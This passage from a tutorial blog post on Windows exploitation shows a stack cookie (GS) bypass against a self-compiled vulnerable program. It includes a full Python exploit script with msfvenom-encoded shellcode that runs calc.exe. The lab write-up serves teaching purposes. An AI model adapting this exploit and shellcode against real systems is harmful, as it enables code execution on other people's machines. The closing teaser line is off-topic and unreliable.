By spawning a new process from the exploit code and connecting to the process's standard stream pipes, I was able to control the pace of the program.

The Popen constructor creates a new process in the background and opens a pipe to the executed program's / process's standard input/output/error streams.

```python
p = Popen(["C:\\blog\\vuln.exe"], stdin=PIPE, stdout=PIPE, stderr=PIPE)
```

When the program starts, it will wait for an integer from STDIN in `memleak()` representing the size of a loop that leaks memory.  The instance / object `p` can be used throughout the program to send data to stdin and read data from stdout and stderr.  Below we send data to the process's stdin with a newline attached.

```python
loop = 40
p.stdin.write(str(loop) + "\n")
```

Next, `memleak()` output is read from the stdout pipe of the running process and saved in `output`

```python
output  = p.stdout.readline().rstrip()
```

In the `main` code I pass `output` to a helper function `get_memleak_values(output)` I created that returns the addresses we need to construct the exploit / to help process the values in the leaked output we need to construct the exploit.

```python
addr = get_memleak_values(output)
```

To refresh, the copy of the stack cookie is found at the 17th address and the stack pointer is at the 8th address.  In the first line, I split the output on each space into a list of addresses where `memleak[0]` contains the `printf>` prompt and `memleak[1:]` contains the leaked addresses.  Therefore, the 17th address can be accessed directly in `memleak[17]` and so on.  The function returns the addresses as a tuple.

```python
def get_memleak_values(output):
  memleak = output.split(' ')

  eax = int(memleak[17],16) # index 17 = eax (stack cookie)
  ret = int(memleak[8],16)  # index 8 = return address (esp)
  ebp = ret - 0x8

  # Output memory leak and calculated registers/values
  print "{0} {1}\n{2}".format(memleak[0], 40, ''.join(x + " " for x in memleak[1:]))
  print "[*] Leaked addresses from memleak:"
  print "eax = 0x{:>08x}".format(eax)
  print "ret = 0x{:>08x}".format(ret)
  print "cookie = 0x{:>08x}\n".format(eax^ebp)  # eax ^ ebp = cookie

  # Return addresses as a tuple
  return (eax, ret)
```

Next, the code passes the addresses returned from memleak to a helper function that crafts the exploit on the fly while vuln.exe waits for more input from STDIN in `overflow()`.

```python
payload = create_payload(addr[0], addr[1])
```

The payload generation in `create_payload(eax, ret)` works exactly as described in this post.  The fixed values in the payload that don't change are the 1024 bytes of padding in buf, the 4 byte address in ebp, the nopsled, and the shellcode.  The only dynamic values are the cookie and return address which are obtained from the running vulnerable program.

Since ebp is only used as a placeholder / for padding to get to the return address, it doesn't matter which value occupies this space.  Just as long as it's 4 bytes in size.  Another thing to point out is the length of the nop sled.  I have tested the exploit with lengths of 30 to 300 bytes with success.  This may differ system to system so it's important to test and experiment!

The shellcode in `gen_shellcode()` is pasted directly from `msfvenom`'s output thanks to its python formatting option.

```python
def create_payload(eax, ret):
  buf  = "\x41" * 1024    # buf
  buf += pack('<I', eax)  # eax = cookie
  buf += "\x42" * 4       # overwrite ebp w/ random 4-byte value
  buf += pack('<I', ret)  # overwrite eip w/ value from memleak
  buf += "\x90" * 100     # nopsled
  buf += gen_shellcode()  # shellcode
  # returns exploit payload
  return buf
```

`create_payload` returns the exploit string to `payload` and sends it to the running program through its stdin pipe with a newline appended.

```python
p.stdin.write(payload + "\n")
```

This is the end of the exploit's core functionality.  The full code with comments and a demo is posted below.

### Demo

This article and the demo are all available on GitHub.

The purpose of this exploit is to make the application run our shellcode which executes an arbitrary command.  In this case, the program runs Calc.exe which is Windows calculator app.  The exploit bypasses ASLR and GS by leveraging a memory disclosure in the program to obtain the cookie and stack pointer address.  Note that after determining the index of addresses in the memleak output, this exploit will continuously succeed on each run.

See below screenshot when the exploit is executed successfully.  

<a href="{{ site.baseurl }}/images/calc.PNG">
<img class="img-center" src="{{ site.baseurl }}/images/calc.PNG">
</a>

And a video of the exploit on my desktop.

<video controls>
  <source src="{{ site.baseurl }}/images/video/vuln-demo.mp4" type="video/mp4">
  Your browser does not support the video tag.
</video>

## Full Python Code

###### <i class="fab fa-github-square fa-fw"></i> [Click here for code repo](https://github.com/c1arissa/windows_exploitation/tree/master/part1)
###### <i class="far fa-file-archive fa-fw"></i> [Download Zip Archive]({{ site.author.github }}/windows_exploitation/archive/master.zip)

```python
"""
  gs_exploit.py
  Windows Modern Exploitation Blog Post
  Part 1: Stack Cookie (GS) Bypass
  Written by Clarissa https://clarissapodell.com

  The target program should be compiled with the command:
  C:\\> cl /Zi vuln.c /link /NXCOMPAT:NO
"""

from subprocess import *
from struct import pack
import time
import sys


def print_banner():
  ''' Prints a banner message at the top of the terminal '''

  print """
    -------------------------------------------------------------
    # Windows Exploitation Part 1: Stack Cookie (GS) Bypass     #
    # by clarissapodell on 7/12/2018                            #
    # tested on Windows 10 x64, compiled as x86 32-bit process  #
    -------------------------------------------------------------
  """


def gen_shellcode():
  ''' Shellcode to execute an arbitrary command in Windows (CALC.exe)
      $ msfvenom -p windows/exec CMD=calc.exe -f python -e x86/shikata_ga_nai \
                 -b '\x00\x0a\x0d' -v shellcode
  '''

  shellcode =  ""
  shellcode += "\xda\xd8\xbd\x21\x75\x35\x98\xd9\x74\x24\xf4\x5a"
  shellcode += "\x31\xc9\xb1\x31\x31\x6a\x18\x03\x6a\x18\x83\xea"
  shellcode += "\xdd\x97\xc0\x64\xf5\xda\x2b\x95\x05\xbb\xa2\x70"
  shellcode += "\x34\xfb\xd1\xf1\x66\xcb\x92\x54\x8a\xa0\xf7\x4c"
  shellcode += "\x19\xc4\xdf\x63\xaa\x63\x06\x4d\x2b\xdf\x7a\xcc"
  shellcode += "\xaf\x22\xaf\x2e\x8e\xec\xa2\x2f\xd7\x11\x4e\x7d"
  shellcode += "\x80\x5e\xfd\x92\xa5\x2b\x3e\x18\xf5\xba\x46\xfd"
  shellcode += "\x4d\xbc\x67\x50\xc6\xe7\xa7\x52\x0b\x9c\xe1\x4c"
  shellcode += "\x48\x99\xb8\xe7\xba\x55\x3b\x2e\xf3\x96\x90\x0f"
  shellcode += "\x3c\x65\xe8\x48\xfa\x96\x9f\xa0\xf9\x2b\x98\x76"
  shellcode += "\x80\xf7\x2d\x6d\x22\x73\x95\x49\xd3\x50\x40\x19"
  shellcode += "\xdf\x1d\x06\x45\xc3\xa0\xcb\xfd\xff\x29\xea\xd1"
  shellcode += "\x76\x69\xc9\xf5\xd3\x29\x70\xaf\xb9\x9c\x8d\xaf"
  shellcode += "\x62\x40\x28\xbb\x8e\x95\x41\xe6\xc4\x68\xd7\x9c"
  shellcode += "\xaa\x6b\xe7\x9e\x9a\x03\xd6\x15\x75\x53\xe7\xff"
  shellcode += "\x32\xab\xad\xa2\x12\x24\x68\x37\x27\x29\x8b\xed"
  shellcode += "\x6b\x54\x08\x04\x13\xa3\x10\x6d\x16\xef\x96\x9d"
  shellcode += "\x6a\x60\x73\xa2\xd9\x81\x56\xc1\xbc\x11\x3a\x28"
  shellcode += "\x5b\x92\xd9\x34"
  return shellcode


def get_memleak_values(output):
  ''' Takes memleak output as an argument and returns the addresses needed
      to construct the exploit.
  '''

  # Split input on each space to create a list of addresses that can be accessed by index
  memleak = output.split(' ')

  # Obtain values by accessing the nth index in the output
  eax = int(memleak[17],16)       # index 17 = eax
  ret = int(memleak[8],16)        # index 8 = return address (esp)
  ebp = ret - 0x8

  # Output memory leak and calculated registers/values
  print "{0} {1}\n{2}".format(memleak[0], 40, ''.join(x + " " for x in memleak[1:]))
  print "[*] Leaked addresses from memleak:"
  print "eax = 0x{:>08x}".format(eax)
  print "ret = 0x{:>08x}".format(ret)
  print "cookie = 0x{:>08x}\n".format(eax^ebp)  # eax ^ ebp = cookie
  # Return tuple of values
  return (eax, ret)


def create_payload(eax, ret):
  ''' Helper function combines all components to create the payload.
      Final result should look like:
      [ 0x414141...1024 ][ cookie ][ 0x42424242 ][  eip  ][ 0x909090... ][ shellcode ]
  '''

  buf  = "\x41" * 1024    # buf
  buf += pack('<I', eax)  # eax = cookie
  buf += "\x42" * 4       # overwrite ebp w/ random 4-byte value
  buf += pack('<I', ret)  # overwrite eip w/ value from memleak
  buf += "\x90" * 100     # nopsled
  buf += gen_shellcode()  # shellcode
  # returns exploit payload
  return buf


def main():
  print_banner()  # print banner message at top

  exe  = "vuln.exe"  # name of program

  p = Popen(["C:\\blog\\" + exe], stdin=PIPE, stdout=PIPE, stderr=PIPE)
  time.sleep(2)  # allow a few seconds to start running

  cmd = ["tlist", "/p", exe]
  p_pid = check_output(cmd) # get PID from tasklist

  # Basic error checking
  if int(p_pid) > 0:
    # Returns greater than 0 for valid PID
    print "[*] Running %s in the background, pid=%s ...\n" % (exe, p_pid)
  else:
    # Returns less than 0 for invalid or non-existent PID
    print "[!] Unable to execute %s ...\n" % exe
    sys.exit(1)

  # Send input to memleak() through stdin pipe with newline appended
  loop = 40
  p.stdin.write(str(loop) + "\n")  

  # Read memleak() output from stdout pipe
  output  = p.stdout.readline().rstrip()

  # Save tuple of addresses from memleak helper function
  addr = get_memleak_values(output)

  # Craft exploit on the fly while vuln.exe waits for more input from STDIN in overflow()
  payload = create_payload(addr[0], addr[1])

  # Send exploit through stdin pipe
  p.stdin.write(payload + "\n")

  read = p.stdout.readline() # main() prints "read>" prompt

  done = p.stdout.readline() # main() prints "done" if overflow() returns normally

  if done:
    # read() is skipped when scanf() leaves an unsatisfied newline in the buffer
    print "[x] Rerun"  # Alert user that payload was never sent
  else:
    print "{0} (Sent {1} byte payload that executes CALC.exe)\n".format(read, len(payload))
    print "[+] Exploit of vuln.exe successful!!"

if __name__ == '__main__':
  main()
```


### Results

Again, we have a fully working exploit that executes our arbitrary shellcode.  With some additional work, we are still able to use our exploit from Stage 1 to overwrite the return address of `vuln()` and redirect program behavior arbitrarily.  Using the Stack Cookie bypass technique described above, we successfully overwrote the stack with the correct security cookie to pass the check and execute our shellcode completely undetected.   

Based on these results and in the presence of a memory leak vulnerability, we can say that Stack Cookie protection does not strengthen or influence CFGuard in any noticeable way.



# References and Further Reading
1. [/GS (Buffer Security Check)](https://docs.microsoft.com/en-us/cpp/build/reference/gs-buffer-security-check)
2. [Reducing the Effective Entropy of GS Cookies by skape (3/2007)](http://uninformed.org/index.cgi?v=7&a=2)
3. [Exploit Writing Tutorial Part 6 by the Corelan Team](https://www.corelan.be/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr/)
4. [GS cookie protection - effectiveness and limitations](https://blogs.technet.microsoft.com/srd/2009/03/16/gs-cookie-protection-effectiveness-and-limitations/)

[1]: https://docs.microsoft.com/en-us/cpp/build/reference/gs-buffer-security-check
[2]: http://uninformed.org/index.cgi?v=7&a=2
[3]: https://www.corelan.be/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr/

*Next up, in [part 2]({{ site.baseurl }}{% link _posts/2018-07-19-windows-bypass-2.md %}) we launch shirt outside the context of another shell and implement some built-in commands.*{: style="font-size: 1.5rem"}
